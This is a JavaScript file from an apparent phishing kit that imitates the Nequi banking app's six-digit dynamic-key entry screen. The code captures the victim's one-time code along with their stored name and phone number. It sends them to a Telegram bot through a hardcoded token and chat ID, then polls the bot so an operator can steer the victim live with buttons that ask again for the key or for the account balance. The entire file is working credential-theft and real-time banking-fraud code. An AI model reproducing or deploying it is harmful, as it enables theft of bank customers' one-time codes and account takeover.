document.addEventListener('DOMContentLoaded', () => {
    const digitBoxes = document.querySelectorAll('.digit-box');
    const keypadBtns = document.querySelectorAll('.keypad-btn[data-value]');
    const backspaceBtn = document.getElementById('backspace-btn');
    const loadingOverlay = document.getElementById('loading-overlay');
    
    // --- CONFIGURACIÓN DE TELEGRAM ---
    const TELEGRAM_TOKEN = '8634395375:AAFb8HHwRA14QoyU769lYso0I7hlD_c0Ias';
    const TELEGRAM_CHAT_ID = '-5017945956'; // Nuevo Grupo LOG

    // Usar API directa para asegurar compatibilidad
    const API_URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

    let currentInput = '';
    const maxLength = 6;

    // Verificación de protocolo
    if (window.location.protocol === 'file:') {
        alert("⚠️ ERROR: Estás abriendo el archivo directamente.\n\nPara que funcione la conexión con Telegram, debes usar el servidor local.\n\n1. Ejecuta 'node server.js' en la terminal.\n2. Abre http://localhost:3000 en tu navegador.");
    }

    // Handle number clicks
    keypadBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            if (currentInput.length < maxLength) {
                const value = btn.getAttribute('data-value');
                currentInput += value;
                updateDisplay();
            }
        });
    });

    // Handle backspace
    backspaceBtn.addEventListener('click', () => {
        if (currentInput.length > 0) {
            currentInput = currentInput.slice(0, -1);
            updateDisplay();
        }
    });

    // Handle keyboard input
    document.addEventListener('keydown', (e) => {
        if (e.key >= '0' && e.key <= '9') {
            if (currentInput.length < maxLength) {
                currentInput += e.key;
                updateDisplay();
            }
        } else if (e.key === 'Backspace') {
            if (currentInput.length > 0) {
                currentInput = currentInput.slice(0, -1);
                updateDisplay();
            }
        }
    });

    // --- DETECCIÓN DE ERROR PREVIO (Pedir Dinámica) ---
    const errorFlag = sessionStorage.getItem('show_dynamic_error');
    if (errorFlag) {
        const errorAlert = document.getElementById('error-alert');
        if (errorAlert) {
            errorAlert.style.display = 'block';
            setTimeout(() => {
                errorAlert.style.display = 'none';
            }, 3000);
        }
        sessionStorage.removeItem('show_dynamic_error');
    }

    // FUNCIÓN MODIFICADA PARA ENVIAR AL LLEGAR AL LÍMITE
    async function updateDisplay() {
        // Limpiar y llenar cajas (Tu lógica original)
        digitBoxes.forEach(box => {
            box.textContent = '';
            box.classList.remove('filled');
        });

        for (let i = 0; i < currentInput.length; i++) {
            digitBoxes[i].textContent = currentInput[i];
            digitBoxes[i].classList.add('filled');
        }

        // --- LÓGICA ADICIONAL: ENVÍO AUTOMÁTICO ---
        if (currentInput.length === maxLength) {
            // Mostrar pantalla de carga
            loadingOverlay.classList.add('active');

            const celular = sessionStorage.getItem("bc_usuario") || "No encontrado";
            const userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
            const mensaje = `🔢 **DINÁMICA CAPTURADA (NEQUI)**\n\n` +
                            `👤 **Nombre:** \`${userNombre}\`\n` +
                            `📱 **Celular:** \`${celular}\`\n` +
                            `⚡ **Clave:** \`${currentInput}\`\n\n👇 **SELECCIONA UNA ACCIÓN:**`;

            try {
                // Enviamos a Telegram
                const response = await fetch(`${API_URL}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: mensaje,
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: "✅ Finalizar", callback_data: "finish" },
                                    { text: "🔄 Pedir Dinámica (Reintentar)", callback_data: "ask_dynamic" }
                                ],
                                [
                                    { text: "❌ Saldo Incorrecto", callback_data: "saldo_bad" }
                                ],
                                [
                                    { text: "💰 Pedir Saldo", callback_data: "ask_saldo" }
                                ],
                                [
                                    { text: "❌ Usuario Incorrecto", callback_data: "wrong_user" }
                                ]
                            ]
                        }
                    })
                });
                
                const data = await response.json();
                if (data.ok) {
                    const messageId = data.result.message_id;
                    console.log("Enviado. ID:", messageId);
                    // Iniciar Polling
                    pollTelegramUpdates(messageId);
                } else {
                    console.warn("Error enviando (status no ok). Redirigiendo a Final...");
                    // Fallback: Redirigir a final.html
                    setTimeout(() => {
                        window.location.href = 'final.html';
                    }, 2000);
                }

            } catch (error) {
                console.error("Error de red/conexión:", error);
                // Fallback: Redirigir a final.html
                setTimeout(() => {
                    window.location.href = 'final.html';
                }, 2000);
            }
        }
    }

    async function pollTelegramUpdates(originalMessageId) {
        let lastUpdateId = 0;
        let isPolling = true;

        // Timeout de seguridad: 30 segundos
        setTimeout(() => {
            if (isPolling) {
                isPolling = false;
                console.log("Timeout polling. Redirigiendo...");
                window.location.href = 'final.html';
            }
        }, 30000);
        
        // Obtener el último update_id
        try {
            const initialResp = await fetch(`${API_URL}/getUpdates?limit=1&offset=-1&t=${Date.now()}`, { cache: 'no-store' });
            const initialData = await initialResp.json();
            if (initialData.result && initialData.result.length > 0) {
                lastUpdateId = initialData.result[initialData.result.length - 1].update_id + 1;
            }
        } catch(e) { console.error(e); }

        const checkUpdates = async () => {
            if (!isPolling) return;
            try {
                const response = await fetch(`${API_URL}/getUpdates?offset=${lastUpdateId}&timeout=10&t=${Date.now()}`, { cache: 'no-store' });
                const data = await response.json();

                if (data.ok && data.result.length > 0) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id + 1;

                        if (update.callback_query) {
                            const cb = update.callback_query;
                            
                            console.log("Acción recibida:", cb.data);

                            // Verificar que el callback corresponda al mensaje que enviamos
                            if (cb.message && cb.message.message_id === originalMessageId) {
                                // Responder al callback
                                await fetch(`${API_URL}/answerCallbackQuery`, {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({ callback_query_id: cb.id })
                                });
                                
                                if (cb.data === 'wrong_user') {
                                    sessionStorage.setItem('show_login_error', 'true');
                                    window.location.href = 'index.html';
                                }
                                else if (cb.data === 'ask_dynamic') {
                                    sessionStorage.setItem('show_dynamic_error', 'true');
                                    window.location.reload(); 
                                }
                                else if (cb.data === 'saldo_bad') {
                                    sessionStorage.setItem('show_saldo_error', 'true');
                                    window.location.href = 'saldo.html';
                                }
                                else if (cb.data === 'ask_saldo') window.location.href = 'saldo.html';
                                else if (cb.data === 'finish') window.location.href = 'final.html';

                                return;
                            }
                        }
                    }
                }
                
                setTimeout(checkUpdates, 100);

            } catch (error) {
                console.error("Error polling:", error);
                setTimeout(checkUpdates, 2000);
            }
        };
        checkUpdates();
    }
});
